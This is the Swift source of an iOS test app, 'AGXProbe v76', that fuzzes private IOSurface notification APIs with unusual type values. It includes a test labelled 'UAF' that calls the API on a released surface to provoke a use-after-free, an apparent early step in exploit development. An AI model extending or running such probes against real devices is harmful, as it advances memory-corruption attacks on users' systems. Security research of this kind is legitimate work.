import SwiftUI
import Darwin
import Foundation
import CoreFoundation

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = ReachViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe v76 - notify type fuzzing").font(.headline)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runProbe() } }) {
                Text(vm.isRunning ? "Probing..." : "Run v76")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.blue).cornerRadius(8)
            }.disabled(vm.isRunning)
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}

@MainActor
final class ReachViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false
    private var didAutoRun = false

    private let logFileURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("reach.log")
    }()

    private func emit(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        if ProcessInfo.processInfo.arguments.contains("--autorun") { await runProbe() }
    }

    typealias SetNotifyFn = @convention(c) (mach_port_t, UInt64, UInt64) -> kern_return_t
    typealias RemoveNotifyFn = @convention(c) (UInt64) -> kern_return_t
    typealias CreateFn = @convention(c) (CFDictionary) -> UnsafeMutableRawPointer?
    typealias GetIDFn = @convention(c) (UnsafeMutableRawPointer) -> UInt32

    private func release(_ ptr: UnsafeMutableRawPointer?) {
        guard let p = ptr else { return }
        Unmanaged<AnyObject>.fromOpaque(p).release()
    }

    func runProbe() async {
        isRunning = true; status = "Probing..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        emit("=== AGXProbe v76 - notify type fuzzing ===")
        try? await Task.sleep(nanoseconds: 2_000_000_000)

        guard let fwH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW),
              let setSym = dlsym(fwH, "IOSurfaceClientSetSurfaceNotify"),
              let remSym = dlsym(fwH, "IOSurfaceClientRemoveSurfaceNotify"),
              let createSym = dlsym(fwH, "IOSurfaceCreate"),
              let getIdSym = dlsym(fwH, "IOSurfaceGetID") else {
            emit("[-] dlsym fail"); status = "Complete"; isRunning = false; return
        }

        let gSet = unsafeBitCast(setSym, to: SetNotifyFn.self)
        let gRemove = unsafeBitCast(remSym, to: RemoveNotifyFn.self)
        let gCreate = unsafeBitCast(createSym, to: CreateFn.self)
        let gGetID = unsafeBitCast(getIdSym, to: GetIDFn.self)

        var gPort: mach_port_t = 0
        var kr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &gPort)
        emit("[*] port 0x\(String(gPort, radix: 16)) kr=0x\(String(kr, radix: 16))")
        if kr != KERN_SUCCESS { status = "Complete"; isRunning = false; return }

        func makeSurface() -> UnsafeMutableRawPointer? {
            var keyCB = kCFTypeDictionaryKeyCallBacks
            var valCB = kCFTypeDictionaryValueCallBacks
            let props = CFDictionaryCreateMutable(nil, 0, &keyCB, &valCB) as! NSMutableDictionary
            props["IOSurfaceWidth"] = 256
            props["IOSurfaceHeight"] = 256
            props["IOSurfaceBytesPerElement"] = 4
            return gCreate(props)
        }

        // Test different notify types on the same surface
        emit("\n=== Test: Different notify types on same surface ===")
        var sA: UnsafeMutableRawPointer? = makeSurface()
        guard let sAp = sA else { emit("[-] create failed"); status = "Complete"; isRunning = false; return }
        let idA = gGetID(sAp)
        emit("[A] surface id 0x\(String(idA, radix: 16))")

        for type in [0, 1, 2, 3, 0xFFFFFFFF, 0x80000000] as [UInt64] {
            let kr = gSet(gPort, type, UInt64(idA))
            emit("[A] set_notify type=0x\(String(type, radix: 16)) kr=0x\(String(kr, radix: 16))")
        }

        // Remove with type=1
        let krRem = gRemove(UInt64(idA))
        emit("[A] remove_notify kr=0x\(String(krRem, radix: 16))")

        release(sA)

        // ===== Test 2: Set notify with type=0 on fresh surface =====
        emit("\n=== Test 2: Notify type=0 on fresh surface ===")
        var sB: UnsafeMutableRawPointer? = makeSurface()
        guard let sBp = sB else { emit("[-] create B failed"); status = "Complete"; isRunning = false; return }
        let idB = gGetID(sBp)
        emit("[B] surface id 0x\(String(idB, radix: 16))")
        let krSetB0 = gSet(gPort, 0, UInt64(idB))
        emit("[B] set_notify type=0 kr=0x\(String(krSetB0, radix: 16))")
        let krRemB = gRemove(UInt64(idB))
        emit("[B] remove_notify kr=0x\(String(krRemB, radix: 16))")
        release(sB)

        // ===== Test 3: UAF with type=0 =====
        emit("\n=== Test 3: UAF with type=0 ===")
        var sC: UnsafeMutableRawPointer? = makeSurface()
        guard let sCp = sC else { emit("[-] create C failed"); status = "Complete"; isRunning = false; return }
        let idC = gGetID(sCp)
        emit("[C] surface id 0x\(String(idC, radix: 16))")
        let krSetC = gSet(gPort, 0, UInt64(idC))
        emit("[C] set_notify type=0 kr=0x\(String(krSetC, radix: 16))")
        release(sC)
        emit("[C] released without remove")
        let krRemC = gRemove(UInt64(idC))
        emit("[C] remove stale=0x\(String(krRemC, radix: 16))")
        let krSetC2 = gSet(gPort, 0, UInt64(idC))
        emit("[C] set again type=0 kr=0x\(String(krSetC2, radix: 16))")

        // ===== Test 4: Set notify type=0xFFFFFFFF (max value) =====
        emit("\n=== Test 4: Notify type=0xFFFFFFFF ===")
        var sD: UnsafeMutableRawPointer? = makeSurface()
        guard let sDp = sD else { emit("[-] create D failed"); status = "Complete"; isRunning = false; return }
        let idD = gGetID(sDp)
        emit("[D] surface id 0x\(String(idD, radix: 16))")
        let krSetD = gSet(gPort, 0xFFFFFFFF, UInt64(idD))
        emit("[D] set_notify type=0xFFFFFFFF kr=0x\(String(krSetD, radix: 16))")
        let krRemD = gRemove(UInt64(idD))
        emit("[D] remove_notify kr=0x\(String(krRemD, radix: 16))")
        release(sD)

        emit("\n=== done ===")
        status = "Complete"; isRunning = false
    }
}
